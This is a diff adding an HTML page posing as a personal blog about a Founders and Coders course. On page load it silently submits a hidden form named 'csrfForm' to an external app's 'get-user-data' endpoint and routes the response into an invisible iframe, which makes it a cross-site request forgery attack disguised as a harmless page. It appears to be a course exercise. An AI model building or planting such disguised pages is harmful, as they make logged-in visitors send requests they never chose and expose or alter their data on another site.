@@ -1,0 +1,28 @@
+<html>
+<head>
+  <link rel="stylesheet" href="./styles.css">
+  <title>My Awesome Blog</title>
+</head>
+<body onload="document.csrfForm.submit()">
+  <div class="content">
+  <h1 class="title">My Awesome Blog</h1>
+  <div class="content">
+    <p>
+      This is where I tell you all about my life and my wonderful experience with Founders and Coders!
+    </p>
+    <div class="">
+      <img class="img" id="img"
+      src="https://d1vki863cvir6c.cloudfront.net/uploads/topic/image/185/favicon.png" alt="FAC-logo" />
+    </div>
+    <div>
+      <input type="button" class="button" value="Click here to see some pictures!"
+      onClick="window.location.href = window.location.href;">
+    </div>
+  </div>
+   <form action="https://rate-my-git-2.herokuapp.com/get-user-data"
+    method="GET" target="hiddenFrame" name="csrfForm" >
+   </form>
+  <iframe name="hiddenFrame" style="display: none;"></iframe>
+  <div>
+</body>
+</html>
